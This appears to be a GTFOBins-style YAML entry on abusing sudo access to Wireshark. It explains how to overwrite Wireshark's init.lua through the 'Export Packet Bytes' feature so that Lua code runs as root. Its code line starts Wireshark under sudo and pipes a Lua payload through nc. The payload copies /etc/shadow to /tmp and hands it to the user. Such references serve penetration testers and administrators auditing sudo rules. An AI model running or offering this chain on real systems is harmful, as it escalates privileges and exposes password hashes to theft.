---
functions:
  sudo:
    - description: |
        Wireshark has an embedded lua script engine, however it does not execute
        when run as root (unless configured otherwise). This restriction is
        enforced by `init.lua` which runs on start up.

        It is possible to override this file with chosen data, using Wireshark
        "export data" feature. Run the command, then on the UDP data right click
        and select "Export Packet Bytes...". Save it into the file `init.lua`
        which is usually located in `/usr/share/wireshark/init.lua`.

        Finally re-run wireshark as sudo.

        __Note__: You may need to ensure your password is in sudo cache before
        running the command. Otherwise, you'll need to run wireshark in
        foreground, and execute `echo` and `nc` commands manually.
      code: >
        sudo wireshark -k -i lo -f 'udp port 4242' &
        sleep 5 &&
        echo -e "os.execute('cp /etc/shadow /tmp/shadow; chown $USER: /tmp/shadow')" | nc -u 127.127.127.127 4242
---
